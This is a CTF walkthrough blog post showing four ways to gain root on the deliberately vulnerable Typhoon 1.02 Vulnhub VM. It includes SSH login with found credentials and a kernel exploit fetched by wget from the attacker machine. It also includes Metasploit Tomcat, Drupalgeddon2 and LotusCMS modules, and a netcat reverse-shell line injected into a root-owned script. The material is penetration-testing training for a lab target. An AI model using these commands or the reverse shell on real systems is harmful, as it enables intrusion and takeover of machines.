@@ -1,0 +1,458 @@
+
+								
+																		Typhoon: 1.02 Vulnhub Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on December 1, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Typhoon VM contains several vulnerabilities and configuration errors. Typhoon can be used to test vulnerabilities in network services, configuration errors, vulnerable web applications, password cracking attacks, privilege escalation attacks, post exploitation steps, information gathering, and DNS attacks. Prisma training involves the practical use of Typhoon.
+Download it from here: https://www.vulnhub.com/entry/typhoon-102,267/
+Penetrating Methodology
+
+Network Scanning (Netdiscover, Nmap)
+1st method of exploiting via exploring MongoDB
+Consider robots.txt
+Explore /MongoDB over browser
+Identify credential
+SSH Login
+Find out kernel version
+Kernel privilege escalation
+Obtain root access
+2nd method of exploiting via tomcat manager (Metasploit)
+Generating bash payload
+Uploading bash payload
+Obtain root access
+3rd Method: Exploiting Drupal CMS
+4th Method: Exploiting Lotus CMS
+
+Since there are multiple ways in which we can exploit this machine. Therefore we have used two methods to capture the flag as follows:
+Method 1:  Exploiting by exploring MongoDB
+Let’s Begin with the Walkthrough!!
+Let’s start off with scanning the network to find our targets IP.
+
+		
+		
+			
+			
+			
+			
+netdiscover
+			
+				
+					
+				
+					1
+				
+						netdiscover
+					
+				
+			
+		
+
+
+We found our target IP –&gt; 192.168.1.101
+Our next motive is to scan the target IP with nmap.
+
+		
+		
+			
+			
+			
+			
+nmap -A 192.168.1.101
+			
+				
+					
+				
+					1
+				
+						nmap -A 192.168.1.101
+					
+				
+			
+		
+
+The NMAP output shows various open ports: 21(ftp), 22(ssh), 25(smtp), 53(domain), 80(http), 110(pop3), 111(rpcbind), 139(netbios-ssn), 143(imap), 445(netbios-ssn), 631(ipp), 993(ssl/imaps), 995(ssl/pop3), 2049(nfs_acl), 3306(mysql), 5432(postgrespl), 8080(http).
+Further, we notice that there is an entry /monoadmin/ in robot.txt as it might be useful.
+
+We also noticed that port 8080 is open for Apache Tomcat/ Coyote JSP Engine 1.1. This could be another way of exploiting this machine. But will see to it later on.
+
+Moving on, Since port 80 is also open. So, we browsed the found directory /mongoadmin/ into the browser. The result displayed is shown in the image. Here we set the change the database to credentials(84mb). It will display a link of 2 Credentials. Click on it.
+
+Clicking on the 2 Credential link will give us Credentials [username]:typhoon and [password]:789456123 . These credentials might be a great help for further enumeration.
+
+After some time, we just strike with an idea WHY NOT USE THE FOUND CREDS TO LOGIN WITH SSH?. Since SSH port 22 is also open.
+Then we simply logged in SSH with CREDENTIALS Username: typhoon &amp; Password: 789456123
+
+		
+		
+			
+			
+			
+			
+ssh typhoon@192.168.1.101
+			
+				
+					
+				
+					1
+				
+						ssh typhoon@192.168.1.101
+					
+				
+			
+		
+
+Then we checked system information and found out Ubuntu 14.04 is running on the target machine. Good thing we were familiar with an exploit for Ubuntu 14.04.
+
+Next, we look for an exploit for ubuntu 14.04 using searchsploit. The exploit we have used have highlighted, after that, we have copied the exploit 37292.c in the /root/ directory. Executing a Python server to download the file in the target machine.
+
+		
+		
+			
+			
+			
+			
+searchsploit ubuntu 14.04
+			
+				
+					
+				
+					1
+				
+						searchsploit ubuntu 14.04
+					
+				
+			
+		
+
+
+Afterward, we have downloaded our exploit 37292.c in the /tmp directory. After compilation and granting permissions to the exploit. We have executed it.
+
+		
+		
+			
+			
+			
+			
+cd /tmp
+wget http://192.168.1.109/37292.c
+ls
+gcc 37292.c -o rootshell
+chmod 777 rootshell
+./rootshell
+cd /root
+ls
+cat root-flag
+			
+				
+					
+				
+					123456789
+				
+						cd /tmpwget http://192.168.1.109/37292.clsgcc 37292.c -o rootshellchmod 777 rootshell./rootshellcd /rootlscat root-flag
+					
+				
+			
+		
+
+Booyah!! We have got the root access and found our FLAG. We take a look at the content of the file and greeted with a congratulatory message.  
+
+Method 2: Exploiting via Tomcat Manager
+Using Tomcat Manager Upload to get the meterpreter and then further establishing a reverse connection to get root access.
+Let’s Begin with the Walkthrough!!
+Since in Method-1 port scanning, we notice that port 8080 is open for Apache Tomcat/ Coyote JSP Engine 1.1. So let’s browse the Target IP on port 8080 on the browser.
+
+We are very familiar with Tomcat Server Login using manager web app due to our previous lab experiences. Without wasting time we straight away logged into Tomcat Server using Metasploit Tomcat Manager using the Default credentials for Tomcat Server Login.
+
+		
+		
+			
+			
+			
+			
+[username]:tomcat
+[password]:tomcat
+			
+				
+					
+				
+					12
+				
+						[username]:tomcat[password]:tomcat
+					
+				
+			
+		
+
+Oh Yeah! We have got a meterpreter. After spending a lot of time of enumeration, we found a directory /tab which consists of file script.sh that is owned by root and has FULL Permission. So we thought of inserting malicious code in script.sh.
+
+		
+		
+			
+			
+			
+			
+use exploit/multi/http/tomcat_mgr_upload
+set rhost 192.168.1.101
+set rport 8080
+set httpusername tomcat
+set httppassword tomcat
+exploit
+			
+				
+					
+				
+					123456
+				
+						use exploit/multi/http/tomcat_mgr_uploadset rhost 192.168.1.101set rport 8080set httpusername tomcatset httppassword tomcatexploit
+					
+				
+			
+		
+
+
+ Moving on!! We need to create a bash code using Msfvenom:
+
+		
+		
+			
+			
+			
+			
+msfvenom –p cmd/unix/reverse_netcat lhost=192.168.1.109 lport=1234 R
+			
+				
+					
+				
+					1
+				
+						msfvenom –p cmd/unix/reverse_netcat lhost=192.168.1.109 lport=1234 R
+					
+				
+			
+		
+
+After that, append the above generated malicious code in the script.sh file.
+
+
+		
+		
+			
+			
+			
+			
+echo "mkfifo /tmp/vvwjo; nc 192.168.1.109 1234 0&lt;/tmp/vvwjo | /bin/sh &gt;/tmp/vvwjo 2&gt;&amp;1; rm /tmp/vvwjo" &gt; script.sh
+			
+				
+					
+				
+					1
+				
+						echo "mkfifo /tmp/vvwjo; nc 192.168.1.109 1234 0&lt;/tmp/vvwjo | /bin/sh &gt;/tmp/vvwjo 2&gt;&amp;1; rm /tmp/vvwjo" &gt; script.sh
+					
+				
+			
+		
+
+
+Since the malicious code got executed with the script.sh file. Therefore we got a reverse shell on our netcat listener.
+Yeah!! We have got the root access and found root-flag. We take a look at the content of the file and greeted with a congratulatory message.
+
+Method 3: Exploiting Drupal CMS
+Unfortunately, on exploring port 80 we didn’t observe any remarkable things, therefore, we try to enumerate web directory with the help of Dirb tool.
+
+		
+		
+			
+			
+			
+			
+dirb http://192.168.1.101
+			
+				
+					
+				
+					1
+				
+						dirb http://192.168.1.101
+					
+				
+			
+		
+
+
+It was wonderful to observe that there was two CMS  as highlighted in the below image.
+
+On exploring /Drupal in the web browser, it put up the following web page which was associated with Drupal cms.
+Without wasting time, we chase towards Metasploit and run the following module to exploit Drupal cms.
+
+		
+		
+			
+			
+			
+			
+use exploit/unix/webapp/drupal_drupalgeddon2
+msf exploit(/unix/webapp/drupal_drupalgeddon2) &gt; set rhost 192.168.1.101
+msf exploit(/unix/webapp/drupal_drupalgeddon2) &gt; set targeturi /drupal
+msf exploit(/unix/webapp/drupal_drupalgeddon2) &gt; exploit
+			
+				
+					
+				
+					1234
+				
+						use exploit/unix/webapp/drupal_drupalgeddon2msf exploit(/unix/webapp/drupal_drupalgeddon2) &gt; set rhost 192.168.1.101msf exploit(/unix/webapp/drupal_drupalgeddon2) &gt; set targeturi /drupalmsf exploit(/unix/webapp/drupal_drupalgeddon2) &gt; exploit
+					
+				
+			
+		
+
+Booom!! It was a terrific moment to see the meterpreter session of the target machine. Now for the post exploitation, you can follow the above methodology which we have already discussed in the 1st method.
+
+Method 4: Exploiting Lotus CMS
+Scroll up and kindly notice the result which we have obtained from the dirb scan, there we had found two CMS. We had already exploit Drupal, now let’s go for next CMS and try to exploit it, if possible
+So on exploring /cms in the web browser, it put up the following web page which was associated with Lotus cms.
+
+Without wasting must time, again we chase towards Metasploit and run the following module to exploit lotus cms.
+
+		
+		
+			
+			
+			
+			
+use exploit/multi/http/lcms_php_exec
+msf exploit(multi/http/lcms_php_exec) &gt; set rhost 192.168.1.101
+msf exploit(multi/http/lcms_php_exec) &gt; set uri /cms/
+msf exploit(multi/http/lcms_php_exec) &gt; exploit
+			
+				
+					
+				
+					1234
+				
+						use exploit/multi/http/lcms_php_execmsf exploit(multi/http/lcms_php_exec) &gt; set rhost 192.168.1.101msf exploit(multi/http/lcms_php_exec) &gt; set uri /cms/msf exploit(multi/http/lcms_php_exec) &gt; exploit
+					
+				
+			
+		
+
+
+Great, we have owned another meterpreter session of the target machine. Now for the post-exploitation you can follow the above methodology which we have already discussed in the 1st method.
+Author: Ashray Gupta is a Security Researcher and Technical Writer at Hacking Articles. Contributing his 2 years in the field of security as a Penetration Tester and Forensic Computer Analyst. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								Alex December 11, 2018 at 11:50 am							
+							
+							
+														
+							
+								Your tutorial doesn’t work, when I try wget to it, it sends out 404 not found.
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
+							
+								secuinfo December 13, 2018 at 7:37 pm							
+							
+							
+														
+							
+								shellshock exploit  work too 😉
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
